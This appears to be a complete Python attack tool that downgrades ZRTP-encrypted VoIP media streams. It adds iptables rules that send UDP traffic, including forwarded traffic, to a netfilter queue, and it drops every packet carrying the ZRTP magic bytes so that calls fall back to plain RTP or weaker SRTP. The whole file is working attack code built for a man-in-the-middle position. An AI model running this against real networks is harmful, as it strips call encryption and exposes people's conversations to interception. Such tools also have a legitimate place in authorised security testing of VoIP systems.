#!/usr/bin/env python3

import sys
import argparse
import subprocess
from netfilterqueue import NetfilterQueue


parser = argparse.ArgumentParser(
    description="A tool to downgrade ZRTP media stream to RTP, SRTP-SDES or SRTP-DTLS. Its vendor and configuration specific, which protocol will be used after downgrade."
)

parser.add_argument(
    '-i',
    dest="INTERFACE",
    type=str,
    help="The interface on which the tool will listen on. If no interface is set, the tool will listen on all interfaces"
)

parser.add_argument(
    '-v',
    action='store_true',
    help="Verbose mode"
)

args = parser.parse_args()


def check_payload(pkt):

    payload = pkt.get_payload()

    if b'\x5a\x52\x54\x50' in payload:
        print("\033[1;32m[+]\033[0m ZRTP packet seen and dropped for downgrade")
        pkt.drop()

    else:
        if args.v:
            print(
                "\033[1;34m[*]\033[0m Packet received, but it doesn't seems to be ZRTP")

        pkt.accept()


def iptables():

    if args.INTERFACE:
        cmd = f"iptables -I INPUT -p udp -j NFQUEUE --queue-num 1 -i {args.INTERFACE}".split()
        subprocess.run(cmd, shell=False)
        cmd = f"iptables -I FORWARD -p udp -j NFQUEUE --queue-num 1 -i {args.INTERFACE}".split()
        subprocess.run(cmd, shell=False)

    else:
        cmd = "iptables -I INPUT -p udp -j NFQUEUE --queue-num 1".split()
        subprocess.run(cmd, shell=False)
        cmd = "iptables -I FORWARD -p udp -j NFQUEUE --queue-num 1".split()
        subprocess.run(cmd, shell=False)


nfqueue = NetfilterQueue()
nfqueue.bind(1, check_payload)

iptables()

print("\033[1;34m[*]\033[0m Start listening for incoming UDP packets ...")
print("")

try:
    nfqueue.run()

except KeyboardInterrupt:
    cmd = "iptables -D INPUT 1".split()
    subprocess.run(cmd, shell=False)
    cmd = "iptables -D FORWARD 1".split()
    subprocess.run(cmd, shell=False)
    print('')

